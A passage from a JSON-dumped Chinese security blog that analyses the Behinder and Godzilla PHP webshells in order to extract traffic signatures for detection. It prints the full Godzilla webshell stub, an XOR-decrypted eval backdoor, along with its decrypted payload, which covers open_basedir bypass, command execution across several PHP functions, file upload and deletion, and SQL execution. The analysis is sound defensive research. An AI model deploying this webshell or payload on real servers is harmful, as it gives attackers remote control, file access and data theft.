encrypt(json_encode($result),$key);&#125;function encrypt($data,$key)&#123; if(!extension_loaded(&apos;openssl&apos;)) &#123; for($i=0;$i&lt;strlen($data);$i++) &#123; $data[$i] = $data[$i]^$key[$i+1&amp;15]; &#125; return $data; &#125; else &#123; return openssl_encrypt($data, &quot;AES128&quot;, $key); &#125;&#125;$content=&quot;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&quot;;main($content); 第二次是调用获取基本信息，代码本来是固定的，但是加了一个随机参数，当然这个参数不会在函数中用的 12345678910111213141516171819202122232425262728293031323334353637383940414243error_reporting(0);function main($whatever) &#123; ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean(); $driveList =&quot;&quot;; if (stristr(PHP_OS,&quot;windows&quot;)||stristr(PHP_OS,&quot;winnt&quot;)) &#123; for($i=65;$i&lt;=90;$i++) &#123; $drive=chr($i).&apos;:/&apos;; file_exists($drive) ? $driveList=$driveList.$drive.&quot;;&quot;:&apos;&apos;; &#125; &#125; else &#123; $driveList=&quot;/&quot;; &#125; $currentPath=getcwd(); //echo &quot;phpinfo=&quot;.$info.&quot;\\n&quot;.&quot;currentPath=&quot;.$currentPath.&quot;\\n&quot;.&quot;driveList=&quot;.$driveList; $osInfo=PHP_OS; $result=array(&quot;basicInfo&quot;=&gt;base64_encode($info),&quot;driveList&quot;=&gt;base64_encode($driveList),&quot;currentPath&quot;=&gt;base64_encode($currentPath),&quot;osInfo&quot;=&gt;base64_encode($osInfo)); //echo json_encode($result); session_start(); $key=$_SESSION[&apos;k&apos;]; //echo json_encode($result); //echo openssl_encrypt(json_encode($result), &quot;AES128&quot;, $key); echo encrypt(json_encode($result), $key);&#125;function encrypt($data,$key)&#123; if(!extension_loaded(&apos;openssl&apos;)) &#123; for($i=0;$i&lt;strlen($data);$i++) &#123; $data[$i] = $data[$i]^$key[$i+1&amp;15]; &#125; return $data; &#125; else &#123; return openssl_encrypt($data, &quot;AES128&quot;, $key); &#125;&#125;$whatever=&quot;7MgESJ8WA7onT3DlRntO54FQCVviYt5ed7j16Op1Tlda5mtXGgngNkfLWmf8JGkK5zNzMVABGM2tWlKglVg8aOlVkKxESfnEbN7M9u7mKK9hxIiJ0hoyOe1muWuCKdsGF4AnEqu2fC1rtXszlhW4uJeuQMulzXGOWNdxOJmzVv71VI4ZoWezGr2ci6gKAIEWBYcMKth8GqhE47mrQjHI59JoK53P6ckDwWHBDbRo6gXPHnxbGbyO3hwMWbr9MEEZ6OCntxJQClMgn8Sl&quot;;main($whatever); 那么这样就导致我们之前的强特征直接消失了 暂时还没找到非常精准的特征去检测，攻防对抗真激烈啊 常规的字符串匹配，正则，应该很难检测了 我没怎么接触机器学习，不知道能否应用到这里，感觉应该是可以的，机器学习可以解决分类问题 毕竟这是一个全程base64加密，解密后都是不可见字符，返回包也是。","categories":[],"tags":[{"name":"webshell","slug":"webshell","permalink":"https://www.giantbranch.cn/tags/webshell/"},{"name":"冰蝎","slug":"冰蝎","permalink":"https://www.giantbranch.cn/tags/冰蝎/"}]},{"title":"哥斯拉Godzilla PHP Webshell分析与检测特征提取","slug":"哥斯拉Godzilla PHP Webshell分析与检测特征提取","date":"2020-08-18T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2020/08/18/哥斯拉Godzilla PHP Webshell分析与检测特征提取/","link":"","permalink":"https://www.giantbranch.cn/2020/08/18/哥斯拉Godzilla PHP Webshell分析与检测特征提取/","excerpt":"","text":"冰蝎v3.0 Beta 2放出来没多久，就被找到了固定长度的特征，过两天又更新了，加了一些随机字符，固定长度特征消失。 哥斯拉也有一定的优点，比冰蝎好一点，但是也存在固定长度的问题 实验环境控制端：win10 + 哥斯拉Godzilla V1.00服务端：Ubuntu 16.04 + Apache + PHP 7.0.33 以php为例的webshell分析php的webshell有两种，一种是php_xor_base64，另一种是php_xor_raw php_xor_base64首先看php_xor_base64 12345678910111213141516171819202122232425262728293031323334&lt;?php session_start(); @set_time_limit(0); @error_reporting(0); function E($D,$K)&#123; for($i=0;$i&lt;strlen($D);$i++) &#123; $D[$i] = $D[$i]^$K[$i+1&amp;15]; &#125; return $D; &#125; function Q($D)&#123; return base64_encode($D); &#125; function O($D)&#123; return base64_decode($D); &#125; $P=&apos;pass&apos;; $V=&apos;payload&apos;; $T=&apos;3c6e0b8a9c15224a&apos;; if (isset($_POST[$P]))&#123; $F=O(E(O($_POST[$P]),$T)); if (isset($_SESSION[$V]))&#123; $L=$_SESSION[$V]; $A=explode(&apos;|&apos;,$L); class C&#123;public function nvoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125; $R=new C(); $R-&gt;nvoke($A[0]); echo substr(md5($P.$T),0,16); echo Q(E(@run($F),$T)); echo substr(md5($P.$T),16); &#125;else&#123; $_SESSION[$V]=$F; &#125; &#125; 密码是$P，也即pass 他是加密通信的，密钥生成shell的时候配置的，默认是key，md5后的前十六位，就是上面的$T=&#39;3c6e0b8a9c15224a&#39;;，这个跟冰蝎v3.0的密钥格式是一致的。 1substr(md5(&apos;key&apos;)),0,16)==&apos;3c6e0b8a9c15224a&apos; 这个代码单单这么看是看不出什么，$F是我们的输入，这有两种情况 1、不存在$_SESSION[$V]，$F就赋值给$_SESSION[$V]2、存在的时候就，$F是run函数的参数 你会发现在这个php中没有run函数，那就只能在调用run之前动态生成了，也就是下面几行代码 12345$L=$_SESSION[$V];$A=explode(&apos;|&apos;,$L);class C&#123;public function nvoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;$R=new C();$R-&gt;nvoke($A[0]); 可以看到存在$_SESSION[$V]的时候，每次都会定义一个C类，里面只有一个函数nvoke，里面是直接执行eval而后面新建一个C类，并调用利用的nvoke函数，参数是$A[0]，$A[0]来源于$_SESSION[$V]经过|分割打散为数组的第一个元素（通过解密，你会发现$_SESSION[$V]里面没有|字符，可能是作者为了以后添加更多功能而设计的，所以没有|的$_SESSION[$V],跟$A[0]的字符是一样的） 为了更清晰地了解整个过程，我们添加下面代码通过输出变量的方式快速获取实际执行的明文代码 12file_put_contents(&quot;/var/www/html/Godzilla/info.txt&quot;, $F , FILE_APPEND | LOCK_EX);file_put_contents(&quot;/var/www/html/Godzilla/info.txt&quot;, &quot;--------------\\n\\n&quot; , FILE_APPEND | LOCK_EX); 通过这个我们得到了初次连接webshell的3次通信解密后的明文，整个过程如下图 第一次发送很多功能的PHP代码下面是第一次发送解密后存在$_SESSION[$V]中的代码，可以看第一个函数就是run函数了！ 简单解析一下，在run函数里面，通过formatParameter函数将参数解析到全局变量$parameters中，最后执行evalFunc()执行对应的函数功能，最后用base64Encode返回结果 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391$parameters=array();function run($pms)&#123; formatParameter($pms.&apos;&amp;ILikeYou=&apos;.base64Encode(&apos;metoo&apos;)); if ($_SESSION[&quot;bypass_open_basedir&quot;]==true)&#123; @bypass_open_basedir(); &#125; return base64Encode(evalFunc());&#125;function bypass_open_basedir()&#123; if(!@file_exists(&apos;bypass_open_basedir&apos;))&#123; @mkdir(&apos;bypass_open_basedir&apos;); &#125; @chdir(&apos;bypass_open_basedir&apos;); @ini_set(&apos;open_basedir&apos;,&apos;..&apos;); @$_Ei34Ww_sQDfq_FILENAME = @dirname($_SERVER[&apos;SCRIPT_FILENAME&apos;]); @$_Ei34Ww_sQDfq_path = str_replace(&quot;\\\\&quot;,&apos;/&apos;,$_Ei34Ww_sQDfq_FILENAME); @$_Ei34Ww_sQDfq_num = substr_count($_Ei34Ww_sQDfq_path,&apos;/&apos;) + 1; $_Ei34Ww_sQDfq_i = 0; while($_Ei34Ww_sQDfq_i &lt; $_Ei34Ww_sQDfq_num)&#123; @chdir(&apos;..&apos;); $_Ei34Ww_sQDfq_i++; &#125; @ini_set(&apos;open_basedir&apos;,&apos;/&apos;); @rmdir($_Ei34Ww_sQDfq_FILENAME.&apos;/&apos;.&apos;bypass_open_basedir&apos;);&#125;function formatParameter($pms)&#123; global $parameters; $pms=explode(&quot;&amp;&quot;,$pms); foreach ($pms as $kv)&#123; $kv=explode(&quot;=&quot;,$kv); if (sizeof($kv)&gt;=2)&#123; $parameters[$kv[0]]=base64Decode($kv[1]); &#125; &#125;&#125;function evalFunc()&#123; @session_write_close(); $className=get(&quot;codeName&quot;); $methodName=get(&quot;methodName&quot;); if ($methodName!=null)&#123; if (strlen(trim($className))&gt;0)&#123; if ($methodName==&quot;includeCode&quot;)&#123; return includeCode(); &#125;else&#123; if (isset($_SESSION[$className]))&#123; return eval($_SESSION[$className]); &#125;else&#123; return &quot;&#123;$className&#125; no load&quot;; &#125; &#125; &#125;else&#123; return $methodName(); &#125; &#125;else&#123; return &quot;methodName Is Null&quot;; &#125;&#125;function deleteDir($p)&#123; $m=@dir($p); while(@$f=$m-&gt;read())&#123; $pf=$p.&quot;/&quot;.$f; @chmod($pf,0777); if((is_dir($pf))&amp;&amp;($f!=&quot;.&quot;)&amp;&amp;($f!=&quot;..&quot;))&#123; deleteDir($pf); @rmdir($pf); &#125;else if (is_file($pf)&amp;&amp;($f!=&quot;.&quot;)&amp;&amp;($f!=&quot;..&quot;))&#123; @unlink($pf); &#125; &#125; $m-&gt;close(); @chmod($p,0777); return @rmdir($p);&#125;function deleteFile()&#123; $F=get(&quot;fileName&quot;); if(is_dir($F))&#123; return deleteDir($F)?&quot;ok&quot;:&quot;fail&quot;; &#125;else&#123; return (file_exists($F)?@unlink($F)?&quot;ok&quot;:&quot;fail&quot;:&quot;fail&quot;); &#125;&#125;function copyFile()&#123; $srcFileName=get(&quot;srcFileName&quot;); $destFileName=get(&quot;destFileName&quot;); if (@is_file($srcFileName))&#123; if (copy($srcFileName,$destFileName))&#123; return &quot;ok&quot;; &#125;else&#123; return &quot;fail&quot;; &#125; &#125;else&#123; return &quot;The target does not exist or is not a file&quot;; &#125;&#125;function moveFile()&#123; $srcFileName=get(&quot;srcFileName&quot;); $destFileName=get(&quot;destFileName&quot;); if (rename($srcFileName,$destFileName))&#123; return &quot;ok&quot;; &#125;else&#123; return &quot;fail&quot;; &#125;&#125;function getBasicsInfo()&#123; $data = array(); $data[&apos;OsInfo&apos;] = @php_uname(); $data[&apos;CurrentUser&apos;] = @get_current_user(); $data[&apos;CurrentUser&apos;] = strlen(trim($data[&apos;CurrentUser&apos;])) &gt; 0 ? $data[&apos;CurrentUser&apos;] : &apos;NULL&apos;; $data[&apos;disable_functions&apos;] = (@ini_get(&apos;disable_functions&apos;)); $data[&apos;disable_functions&apos;] = strlen(trim($data[&apos;disable_functions&apos;])) &gt; 0 ? $data[&apos;disable_functions&apos;] : @get_cfg_var(&apos;disable_functions&apos;); $data[&apos;timezone&apos;] = @ini_get(&apos;date.timezone&apos;); $data[&apos;encode&apos;] = @ini_get(&apos;exif.encode_unicode&apos;); $data[&apos;extension_dir&apos;] = @ini_get(&apos;extension_dir&apos;); $data[&apos;include_path&apos;] = @ini_get(&apos;include_path&apos;); $data[&apos;PHP_SAPI&apos;] = PHP_SAPI; $data[&apos;PHP_VERSION&apos;] = PHP_VERSION; $data[&apos;memory_limit&apos;] = ini_get(&apos;memory_limit&apos;); $data[&apos;upload_max_filesize&apos;] = ini_get(&apos;upload_max_filesize&apos;); $data[&apos;post_max_size&apos;] = ini_get(&apos;post_max_size&apos;); $data[&apos;max_execution_time&apos;] = ini_get(&apos;max_execution_time&apos;); $data[&apos;max_input_time&apos;] = ini_get(&apos;max_input_time&apos;); $data[&apos;default_socket_timeout&apos;] = ini_get(&apos;default_socket_timeout&apos;); $data[&apos;mygid&apos;] = @getmygid(); $data[&apos;mypid&apos;] = @getmypid(); $data[&apos;SERVER_SOFTWAREypid&apos;] = @$_SERVER[&apos;SERVER_SOFTWARE&apos;]; $data[&apos;SERVER_PORT&apos;] = @$_SERVER[&apos;SERVER_PORT&apos;]; $data[&apos;loaded_extensions&apos;] = @implode(&apos;,&apos;, @get_loaded_extensions()); $data[&apos;short_open_tag&apos;] = @get_cfg_var(&apos;short_open_tag&apos;); $data[&apos;short_open_tag&apos;] = @(int)$data[&apos;short_open_tag&apos;] == 1 ? &apos;true&apos; : &apos;false&apos;; $data[&apos;asp_tags&apos;] = @get_cfg_var(&apos;asp_tags&apos;); $data[&apos;asp_tags&apos;] = (int)$data[&apos;asp_tags&apos;] == 1 ? &apos;true&apos; : &apos;false&apos;; $data[&apos;safe_mode&apos;] = @get_cfg_var(&apos;safe_mode&apos;); $data[&apos;safe_mode&apos;] = (int)$data[&apos;safe_mode&apos;] == 1 ? &apos;true&apos; : &apos;false&apos;; $data[&apos;CurrentDir&apos;] = str_replace(&apos;\\\\&apos;, &apos;/&apos;, @dirname($_SERVER[&apos;SCRIPT_FILENAME&apos;])); $data[&apos;FileRoot&apos;] = &apos;&apos;; if (substr(__FILE__, 0, 1) != &apos;/&apos;) &#123;foreach (range(&apos;A&apos;, &apos;Z&apos;) as $L)&#123; if (@is_dir(&quot;&#123;$L&#125;:&quot;))&#123; $data[&apos;FileRoot&apos;] .= &quot;&#123;$L&#125;:/;&quot;;&#125;&#125;;&#125;; $data[&apos;FileRoot&apos;] = (strlen(trim($data[&apos;FileRoot&apos;])) &gt; 0 ? $data[&apos;FileRoot&apos;] : &apos;/&apos;); $data[&apos;FileRoot&apos;]= substr_count($data[&apos;FileRoot&apos;],substr(__FILE__, 0, 1))&lt;=0?substr(__FILE__, 0, 1).&quot;:/&quot;:$data[&apos;FileRoot&apos;]; $result=&quot;&quot;; foreach($data as $key=&gt;$value)&#123; $result.=$key.&quot; : &quot;.$value.&quot;\\n&quot;; &#125; return $result;&#125;function getFile()&#123; $dir=get(&apos;dirName&apos;); $dir=(strlen(@trim($dir))&gt;0)?trim($dir):str_replace(&apos;\\\\&apos;,&apos;/&apos;,dirname(__FILE__)); $dir.=&quot;/&quot;; $path=$dir; $allFiles = @scandir($path); $data=&quot;&quot;; if ($allFiles!=null)&#123; $data.=&quot;ok&quot;; $data.=&quot;\\n&quot;; $data.=$path; $data.=&quot;\\n&quot;; foreach ($allFiles as $fileName) &#123; if ($fileName!=&quot;.&quot;&amp;&amp;$fileName!=&quot;..&quot;)&#123; $fullPath = $path.$fileName; $lineData=array(); array_push($lineData,$fileName); array_push($lineData,@is_file($fullPath)?&quot;1&quot;:&quot;0&quot;); array_push($lineData,date(&quot;Y-m-d H:i:s&quot;, @filemtime($fullPath))); array_push($lineData,@filesize($fullPath)); $fr=(@is_readable($fullPath)?&quot;R&quot;:&quot;&quot;).(@is_writable($fullPath)?&quot;W&quot;:&quot;&quot;).(@is_executable($fullPath)?&quot;X&quot;:&quot;&quot;); array_push($lineData,(strlen($fr)&gt;0?$fr:&quot;F&quot;)); $data.=(implode(&quot;\\t&quot;,$lineData).&quot;\\n&quot;); &#125; &#125; &#125;else&#123; return &quot;Path Not Found Or No Permission!&quot;; &#125; return $data;&#125;function readFileContent()&#123; $fileName=get(&quot;fileName&quot;); if (@is_file($fileName))&#123; if (@is_readable($fileName))&#123; return file_get_contents($fileName); &#125;else&#123; return &quot;No Permission!&quot;; &#125; &#125;else&#123; return &quot;File Not Found&quot;; &#125;&#125;function uploadFile()&#123; $fileName=get(&quot;fileName&quot;); $fileValue=get(&quot;fileValue&quot;); if (@file_put_contents($fileName,$fileValue)!==false)&#123; return &quot;ok&quot;; &#125;else&#123; return &quot;fail&quot;; &#125;&#125;function newDir()&#123; $dir=get(&quot;dirName&quot;); if (@mkdir($dir,0777,true)!==false)&#123; return &quot;ok&quot;; &#125;else&#123; return &quot;fail&quot;; &#125;&#125;function newFile()&#123; $fileName=get(&quot;fileName&quot;); if (@file_put_contents($fileName,&quot;&quot;)!==false)&#123; return &quot;ok&quot;; &#125;else&#123; return &quot;fail&quot;; &#125;&#125;function execCommand()&#123; $result = &quot;&quot;; $command = get(&quot;cmdLine&quot;); $PadtJn = @ini_get(&apos;disable_functions&apos;); if (! empty($PadtJn)) &#123; $PadtJn = preg_replace(&apos;/[, ]+/&apos;, &apos;,&apos;, $PadtJn); $PadtJn = explode(&apos;,&apos;, $PadtJn); $PadtJn = array_map(&apos;trim&apos;, $PadtJn); &#125; else &#123; $PadtJn = array(); &#125; if (FALSE !== strpos(strtolower(PHP_OS), &apos;win&apos;)) &#123; $command = $command . &quot; 2&gt;&amp;1\\n&quot;; &#125; if (is_callable(&apos;system&apos;) and ! in_array(&apos;system&apos;, $PadtJn)) &#123; ob_start(); system($command); $result = ob_get_contents(); ob_end_clean(); &#125; else if (is_callable(&apos;proc_open&apos;) and ! in_array(&apos;proc_open&apos;, $PadtJn)) &#123; $handle = proc_open($command, array(array(&apos;pipe&apos;,&apos;r&apos;),array(&apos;pipe&apos;,&apos;w&apos;),array(&apos;pipe&apos;,&apos;w&apos;)),$pipes); $result = NULL; while (! feof($pipes[1])) &#123; $result .= fread($pipes[1], 1024); &#125; @proc_close($handle); &#125; else if (is_callable(&apos;passthru&apos;) and ! in_array(&apos;passthru&apos;, $PadtJn)) &#123; ob_start(); passthru($command); $result = ob_get_contents(); ob_end_clean(); &#125; else if (is_callable(&apos;shell_exec&apos;) and ! in_array(&apos;shell_exec&apos;, $PadtJn)) &#123; $result = shell_exec($command); &#125; else if (is_callable(&apos;exec&apos;) and ! in_array(&apos;exec&apos;, $PadtJn)) &#123; $result = array(); exec($command, $result); $result = join(chr(10), $result) . chr(10); &#125; else if (is_callable(&apos;exec&apos;) and ! in_array(&apos;popen&apos;, $PadtJn)) &#123; $fp = popen($command, &apos;r&apos;); $result = NULL; if (is_resource($fp)) &#123; while (! feof($fp)) &#123; $result .= fread($fp, 1024); &#125; &#125; @pclose($fp); &#125; else &#123; return &quot;none of proc_open/passthru/shell_exec/exec/exec is available&quot;; &#125; return $result;&#125;function execSql()&#123; $dbType=get(&quot;dbType&quot;); $dbHost=get(&quot;dbHost&quot;); $dbPort=get(&quot;dbPort&quot;); $username=get(&quot;dbUsername&quot;); $password=get(&quot;dbPassword&quot;); $execType=get(&quot;execType&quot;); $execSql=get(&quot;execSql&quot;); function mysql_exec($host,$port,$username,$password,$execType,$sql)&#123; // 创建连接 $conn = new mysqli($host,$username,$password,&quot;&quot;,$port); // Check connection if ($conn-&gt;connect_error) &#123; return $conn-&gt;connect_error; &#125; $result = $conn-&gt;query($sql); if ($conn-&gt;error)&#123; return $conn-&gt;error; &#125; $result = $conn-&gt;query($sql); if ($execType==&quot;update&quot;)&#123; return &quot;Query OK, &quot;+$conn-&gt;affected_rows+&quot; rows affected&quot;; &#125;else&#123; $data=&quot;ok\\n&quot;; while ($column = $result-&gt;fetch_field())&#123; $data.=base64_encode($column-&gt;name).&quot;\\t&quot;; &#125; $data.=&quot;\\n&quot;; if ($result-&gt;num_rows &gt; 0) &#123; // 输出数据 while($row = $result-&gt;fetch_assoc()) &#123; foreach ($row as $value)&#123; $data.=base64_encode($value).&quot;\\t&quot;; &#125; $data.=&quot;\\n&quot;; &#125; &#125; return $data; &#125; &#125; function pdoExec($databaseType,$host,$port,$username,$password,$execType,$sql)&#123; try &#123; $conn = new PDO(&quot;&#123;$databaseType&#125;:host=$host;port=&#123;$port&#125;;&quot;, $username, $password); // 设置 PDO 错误模式为异常 $conn-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); if ($execType==&quot;update&quot;)&#123; return &quot;Query OK, &quot;+$conn-&gt;exec($sql)+&quot; rows affected&quot;; &#125;else&#123; $data=&quot;ok\\n&quot;; $stm=$conn-&gt;prepare($sql); $stm-&gt;execute(); $row=$stm-&gt;fetch(PDO::FETCH_ASSOC); $_row=&quot;\\n&quot;; foreach (array_keys($row) as $key)&#123; $data.=base64_encode($key).&quot;\\t&quot;; $_row.=base64_encode($row[$key]).&quot;\\t&quot;; &#125; $data.=$_row.&quot;\\n&quot;; while ($row=$stm-&gt;fetch(PDO::FETCH_ASSOC))&#123; foreach (array_keys($row) as $key)&#123; $data.=base64_encode($row[$key]).&quot;\\t&quot;; &#125; $data.=&quot;\\n&quot;; &#125; return $data; &#125; &#125; catch(PDOException $e) &#123; return $e-&gt;getMessage(); &#125; &#125; if ($dbType==&quot;mysql&quot;)&#123; if (extension_loaded(&quot;mysqli&quot;))&#123; return mysql_exec($dbHost,$dbPort,$username,$password,$execType,$execSql); &#125;else if (extension_loaded(&quot;pdo&quot;))&#123; return pdoExec($dbType,$dbHost,$dbPort,$username,$password,$execType,$execSql); &#125;else&#123; return &quot;no extension&quot;; &#125; &#125;else if (extension_loaded(&quot;pdo&quot;))&#123; return pdoExec($dbType,$dbHost,$dbPort,$username,$password,$execType,$execSql); &#125;else&#123; return &quot;no extension&quot;; &#125; return &quot;no extension&quot;;&#125;function base64Encode($data)&#123; return base64_encode($data);&#125;function test()&#123; return &quot;ok&quot;;&#125;function get($key)&#123; global $parameters; if (isset($parameters[$key]))&#123; return $parameters[$key]; &#125;else&#123; return null; &#125;&#125;function includeCode()&#123; @session_start(); $classCode=get(&quot;binCode&quot;); $codeName=get(&quot;codeName&quot;); $_SESSION[$codeName]=$classCode; @session_write_close(); return &quot;ok&quot;;&#125;function base64Decode($string)&#123; return base64_decode($string);&#125; 我们单独把evalFunc拿出来看看，就是通过获取参数methodName的值，之后一般都是走调用$methodName()的路径 1234567891011121314151617181920212223function evalFunc()&#123; @session_write_close(); $className=get(&quot;codeName&quot;); $methodName=get(&quot;methodName&quot;); if ($methodName!=null)&#123; if (strlen(trim($className))&gt;0)&#123; if ($methodName==&quot;includeCode&quot;)&#123; return includeCode(); &#125;else&#123; if (isset($_SESSION[$className]))&#123; return eval($_SESSION[$className]); &#125;else&#123; return &quot;&#123;$className&#125; no load&quot;; &#125; &#125; &#125;else&#123; return $methodName(); &#125; &#125;else&#123; return &quot;methodName Is Null&quot;; &#125;&#125; 第二次调用test函数服务端收到的解密结果是： 1methodName=dGVzdA== 我们base64解码一下参数的值： 1methodName=test 所以是调用上面的test函数，就是直接返回ok而已 123function test()&#123; return &quot;ok&quot;;&#125; 第三次获取基本信息服务端收到的解密结果是： 1methodName=Z2V0QmFzaWNzSW5mbw== 我们base64解码一下参数的值： 1methodName=getBasicsInfo 就是调用getBasicsInfo函数，那就是我们进入webshell后看到的服务器的一些基础信息了 123456789101112131415161718192021222324252627282930313233343536373839404142function getBasicsInfo()&#123; $data = array(); $data[&apos;OsInfo&apos;] = @php_uname(); $data[&apos;CurrentUser&apos;] = @get_current_user(); $data[&apos;CurrentUser&apos;] = strlen(trim($data[&apos;CurrentUser&apos;])) &gt; 0 ? $data[&apos;CurrentUser&apos;] : &apos;NULL&apos;; $data[&apos;disable_functions&apos;] = (@ini_get(&apos;disable_functions&apos;)); $data[&apos;disable_functions&apos;] = strlen(trim($data[&apos;disable_functions&apos;])) &gt; 0 ? $data[&apos;disable_functions&apos;] : @get_cfg_var(&apos;disable_functions&apos;); $data[&apos;timezone&apos;] = @ini_get(&apos;date.timezone&apos;); $data[&apos;encode&apos;] = @ini_get(&apos;exif.encode_unicode&apos;); $data[&apos;extension_dir&apos;] = @ini_get(&apos;extension_dir&apos;); $data[&apos;include_path&apos;] = @ini_get(&apos;include_path&apos;); $data[&apos;PHP_SAPI&apos;] = PHP_SAPI; $data[&apos;PHP_VERSION&apos;] = PHP_VERSION; $data[&apos;memory_limit&apos;] = ini_get(&apos;memory_limit&apos;); $data[&apos;upload_max_filesize&apos;] = ini_get(&apos;upload_max_filesize&apos;); $data[&apos;post_max_size&apos;] = ini_get(&apos;post_max_size&apos;); $data[&apos;max_execution_time&apos;] = ini_get(&apos;max_execution_time&apos;); $data[&apos;max_input_time&apos;] = ini_get(&apos;max_input_time&apos;); $data[&apos;default_socket_timeout&apos;] = ini_get(&apos;default_socket_timeout&apos;); $data[&apos;mygid&apos;] = @getmygid(); $data[&apos;mypid&apos;] = @getmypid(); $data[&apos;SERVER_SOFTWAREypid&apos;] = @$_SERVER[&apos;SERVER_SOFTWARE&apos;]; $data[&apos;SERVER_PORT&apos;] = @$_SERVER[&apos;SERVER_PORT&apos;]; $data[&apos;loaded_extensions&apos;] = @implode(&apos;,&apos;, @get_loaded_extensions()); $data[&apos;short_open_tag&apos;] = @get_cfg_var(&apos;short_open_tag&apos;); $data[&apos;short_open_tag&apos;] = @(int)$data[&apos;short_open_tag&apos;] == 1 ? &apos;true&apos; : &apos;false&apos;; $data[&apos;asp_tags&apos;] = @get_cfg_var(&apos;asp_tags&apos;); $data[&apos;asp_tags&apos;] = (int)$data[&apos;asp_tags&apos;] == 1 ? &apos;true&apos; : &apos;false&apos;; $data[&apos;safe_mode&apos;] = @get_cfg_var(&apos;safe_mode&apos;); $data[&apos;safe_mode&apos;] = (int)$data[&apos;safe_mode&apos;] == 1 